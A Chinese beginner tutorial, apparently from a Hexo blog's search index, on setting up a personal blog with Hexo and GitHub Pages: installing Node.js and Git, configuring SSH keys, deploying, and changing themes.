      <url>/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用Hexo和GitHub搭建博客的原理主要涉及静态网站生成与托管两个核心环节：</p><p>首先，Hexo是一个基于Node.js的静态博客框架。它的工作原理是解析使用Markdown（或其他渲染引擎）编写的文章，并利用主题模板生成静态网页。这意味着，当使用Hexo创建博客时，其实是在本地编写和预览博客的内容。Hexo的优势在于其快速、简洁且高效，使创作者无需关注太多技术细节。</p><p>然后，生成的静态网页需要托管到网络上以供他人访问。GitHub Pages是一个很好的选择，它是一个允许用户在其GitHub仓库上托管静态网页的服务。通过将Hexo生成的静态网页推送到GitHub仓库，并利用GitHub Pages的设置功能，就可以将博客发布到互联网上。</p><p>因此，使用Hexo+GitHub搭建博客的原理就是：利用Hexo生成静态网页，然后将这些网页托管到GitHub Pages上，从而实现博客的在线发布和访问。</p><p>具体来说，搭建过程主要包括以下几个步骤：</p><ol><li>安装Git和Node.js，这是使用Hexo和GitHub的前提。</li><li>安装Hexo，并初始化博客项目。</li><li>在GitHub上创建个人仓库，用于存放博客的源代码和静态网页。</li><li>将Hexo生成的静态网页推送到GitHub仓库。</li><li>在GitHub仓库中设置GitHub Pages，选择正确的分支和目录，以便正确托管静态网页。</li><li>更改Hexo的主题，以定制博客外观。</li><li>设置个人域名（可选），以便使用自定义域名访问博客。</li><li>开始使用Hexo编写和发布文章，每次发布新文章时，只需运行Hexo的生成命令，然后将生成的静态网页推送到GitHub即可。</li></ol><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="注册github账号"><a href="#注册github账号" class="headerlink" title="注册github账号"></a>注册github账号</h2><p>前往github官网进行账号注册。（若已有账号，此步骤可忽略）</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://www.github.com/    </span><br></pre></td></tr></table></figure><p>注册之后，要记住邮箱和用户名，这块在后面会用到。</p><h2 id="安装NodeJS"><a href="#安装NodeJS" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h2><p>Hexo是基于NodeJS的静态框架博客，所以，如果要安装Hexo，前提条件是要有NodeJS的环境。<br>进入NodeJS官网，下载对应的版本。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709927.png" alt="image-20240409170903874">  </p><p>如果是windows，安装的时候建议无脑下一步就行，如果 C 盘不吃紧的话，然后勾选所有组件，并勾选 Add to Path 将其添加到系统环境变量。</p><p>如果是Linux，可以参考这篇文章：</p><p><a href="https://blog.csdn.net/qq_41974199/article/details/119328353">https://blog.csdn.net/qq_41974199/article/details/119328353</a></p><p>安装Node.js 会包含环境变量以及 npm 的安装，安装后，可以在命令行输入如下命令检测是否安装成功：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v   //显示 nodejs 的版本号。</span><br><span class="line">npm -v    //显示 npm 的版本号</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709361.png" alt="image-20240409170920334">  </p><p>【注】这块推荐使用14以上的nodeJS版本，之前用的v10的版本，会报错。</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>若为windows，需要安装Git bash，所有安装建议都无脑下一步即可。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709228.png" alt="image-20240409170930145">  </p><p>若为Linux，直接命令行在线安装即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709444.png" alt="image-20240409170945400">  </p><h2 id="设置用户名和邮箱"><a href="#设置用户名和邮箱" class="headerlink" title="设置用户名和邮箱"></a>设置用户名和邮箱</h2><p>因为 Git 是分布式版本控制系统，所以需要设置用户名和邮箱作为一个标识，在命令行输入如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;user_name&quot;</span> <span class="comment"># user_name 填入 GitHub 用户名</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;user_email&quot;</span> <span class="comment"># user_email 填入 GitHub 注册的邮箱</span></span><br></pre></td></tr></table></figure><p>此处全局设置用户名和邮箱后，将作为本地和github同步的 **[UserName]**。</p><h2 id="搭建github仓库"><a href="#搭建github仓库" class="headerlink" title="搭建github仓库"></a>搭建github仓库</h2><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>登录github官网后，点击 “New repository”，创建一个名字为username.github.io（这里的 username 要替换成自己的实际的用户名） 的仓库。</p><p>比如，之前设置的用户名为 “muhe”，则这块创建的仓库名字为 muhe.github.io</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709357.png" alt="image-20240409170957327">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710821.png" alt="image-20240409171006790">  </p><h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><p>使用git，输入如下命令，生成一对公私钥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;user.email&quot;</span> # user.email 为GitHub 上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码。查看是否已经有 ssh 密钥。打开用户目录 &#x2F;root&#x2F;.ssh</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710435.png" alt="image-20240409171016406"> </p><p>然后找到生成的 .ssh 的文件夹中的 id_rsa.pub 密钥，将内容全部复制。</p><p>其中 id_rsa 是私钥不能泄露，id_rsa.pub 是公钥可以放心告诉他人。</p><p>打开<a href="https://github.com/settings/ssh/new">GitHub SSH and GPG keys</a> 页面，新建一个 ssh key：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710250.png" alt="image-20240409171031214">  </p><p>Title 为标题，任意填即可，将刚刚复制的 id_rsa.pub 内容粘贴进去，最后点击 Add SSH key。在 Git Bash 中检测 GitHub 公钥设置是否成功，输入如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>验证是否可以连接成功，若连接成功的话，显示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710942.png" alt="image-20240409171040917">  </p><p>这一步骤，相当于生成了本地和github仓库的 <strong>[Password]</strong></p><h1 id="使用Hexo博客框架"><a href="#使用Hexo博客框架" class="headerlink" title="使用Hexo博客框架"></a>使用Hexo博客框架</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hexo 是一个简单、快速、强大的基于 Github Pages 的博客框架，支持 Markdown 格式。</p><p>集成了众多优秀插件和主题。</p><p>由于 Github Pages 存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以 Hexo 所做的就是将这些 md 文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到 GitHub 。</p><h2 id="安装与初始化"><a href="#安装与初始化" class="headerlink" title="安装与初始化"></a>安装与初始化</h2><p>输入如下命令进行安装：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli # 此命令完成对 hexo 的安装</span><br></pre></td></tr></table></figure><p>安装完成后，在电脑的某个地方新建一个文件夹（名字可以随便取）专门用于存放博客代码，比如我的是 &#x2F;root&#x2F;blog，由于这个文件夹将来存放博客的所有内容和素材，以及所有的博客操作都会在其中完成，所以最好不要随便放。</p><p>进入上面新建的目录，输入如下命令进行初始化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo init # 该命令完成 hexo 在本地博客目录的初始化</span><br></pre></td></tr></table></figure><h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><p>输入如下命令，生成所需的静态文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo g # 生成静态文件</span><br></pre></td></tr></table></figure><p>执行以上命令后，Hexo 就会在 public 文件夹中生成相关的 html 文件，这些文件将来都是要提交到 GitHub 上的 username.github.io 的仓库中去的。</p><h2 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo s # 开启本地预览</span><br></pre></td></tr></table></figure><p>hexo s 是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a> 即可看到内容，Ctrl+C 停止本地预览。本地预览可以实时查看博客的编辑情况，待博客写完后一起部署到 GitHub 上。</p><p>第一次初始化的时候 hexo 已经帮我们写了一篇名为 Hello World 的文章，默认的主题比较丑。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710615.png" alt="image-20240409171052488">  </p><h1 id="上传到GitHub"><a href="#上传到GitHub" class="headerlink" title="上传到GitHub"></a>上传到GitHub</h1><h2 id="设置站点配置文件"><a href="#设置站点配置文件" class="headerlink" title="设置站点配置文件"></a>设置站点配置文件</h2><p>hexo 有 2 种 _config.yml 文件，一个是根目录下的全局的 _config.yml，一个是各个主体 theme 下的 _config.yml。将前者称为站点配置文件， 后者称为主题配置文件。</p><p>打开根目录下站点配置文件 _config.yml，配置有关 deploy 的部分：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git<span class="meta">@github</span>.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>这块在动配置文件的时候，需要主要变量和值之前是要用空格来进行分隔的。</p><p>如 “type:git”，会报错；但使用”type: git”，不会报错。</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>输入如下命令，安装部署插件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save # 安装部署插件</span><br></pre></td></tr></table></figure><p>若并进行上述操作，直接部署的时候，会报错。</p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><p>输入如下命令，将本地的文件+资源等上传到github</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p>部署成功后，打开对应的网址  <a href="https://www.username.github.io/">https://www.username.github.io</a></p><p>如果出现了和本地预览一样的效果，那么，表明部署成功。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711823.png" alt="image-20240409171102708"> </p><h1 id="网站基本信息的修改"><a href="#网站基本信息的修改" class="headerlink" title="网站基本信息的修改"></a><strong>网站基本信息的修改</strong></h1><p>搭建好网站之后，有许多配置信息需要我们去修改，比如网站的标题、标签等选项，具体修改步骤如下：</p><p>打开博客目录下的_config.yml文件，找到如图所示的选项</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711765.png" alt="image-20240409171116734"> </p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>title</td><td>网站的标题</td></tr><tr><td>subtitle</td><td>网站的副标题</td></tr><tr><td>description</td><td>对于网站的描述，主要用于SEO</td></tr><tr><td>keywords</td><td>网站的关键词，支持多个关键词</td></tr><tr><td>author</td><td>作者名</td></tr><tr><td>language</td><td>网站使用的语言，对于简体中文用户来说，语言的设置跟使用不同的主题有关，可以参考各自主题的文档自行配置，一般为zh-CN</td></tr><tr><td>timezone</td><td>设置网站的时区，如果不填则默认使用你电脑的时区</td></tr></tbody></table><p>ps：更多的配置信息修改可以去hexo的官方文档，<a href="https://hexo.io/zh-cn/docs/configuration.html">戳我跳转</a>，可以修改一个选项之后，执行hexo clean、hexo g、hexo s在本地看一下效果，等全部修改好之后再推送到仓库。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711978.png" alt="image-20240409171129884"> </p><h1 id="更换Hexo主题"><a href="#更换Hexo主题" class="headerlink" title="更换Hexo主题"></a>更换Hexo主题</h1><p>hexo默认的主题有点ugly，修改好基本配置信息之后，可以考虑换一个主题，主题多可以说的上是hexo框架的一大卖点，<a href="https://hexo.io/themes/">戳我去挑选主题</a>，界面如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711010.png" alt="image-20240409171137932"> </p><p>下面推荐几种看起来不错的主题：</p><h2 id="NexT"><a href="#NexT" class="headerlink" title="NexT"></a>NexT</h2><ul><li><a href="https://github.com/theme-next/hexo-theme-next">仓库地址</a></li><li><a href="https://theme-next.js.org/">预览地址</a></li><li>首先就是大名鼎鼎的Next主题了，页面简洁，功能全，用的人多，网上的个性化配置教程也超级多，用这个主题如果遇到问题，在网上基本上能找到对应的解决办法。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711015.png" alt="image-20240409171147964"> </p><h2 id="Butterfly"><a href="#Butterfly" class="headerlink" title="Butterfly"></a>Butterfly</h2><ul><li><a href="https://github.com/jerryc127/hexo-theme-butterfly">仓库地址</a></li><li><a href="https://butterfly.js.org/">预览地址</a></li><li>挺好看的一个主题，用的人也挺多的：</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091711188.png" alt="image-20240409171156067"> </p><h2 id="Nexmoe"><a href="#Nexmoe" class="headerlink" title="Nexmoe"></a>Nexmoe</h2><ul><li><a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe">仓库地址</a></li><li><a href="https://nexmoe.com/">预览地址</a>)</li><li>看起来不错~~</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712812.png" alt="image-20240409171235695"> </p><h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><p>这块个人比较喜欢的一款主题<strong>Metery</strong>，部署过程如下：</p><p>Hexo的所有主题源代码都是托管在Github的，更换主题第一步：<strong>将该主题的源代码clone下来，放到本地Hexo站点根目录下的<strong><strong>themes</strong></strong>文件夹中</strong>。</p><p>访问Metery主题的Github仓库,复制仓库地址：<a href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712700.png" alt="image-20240409171247643"> </p><p>然后在本地<strong>站点根目录</strong>打开git bash 命令行，进入themes文件夹，开始拉取代码到本地：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cd themes</span><br><span class="line">git clone https:<span class="comment">//github.com/blinkfox/hexo-theme-matery.git</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091712160.png" alt="image-20240409171256135"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713557.png" alt="image-20240409171302526">  </p><p>更换主题</p><p>下载Hexo的主题到&#x2F;themes文件夹之后，要在<strong>站点配置文件</strong>中配置使用该主题：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">vim config.yml</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713874.png" alt="image-20240409171309848">  </p><p>hexo一键三连后，查看效果</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091713074.png" alt="image-20240409171347929"> </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
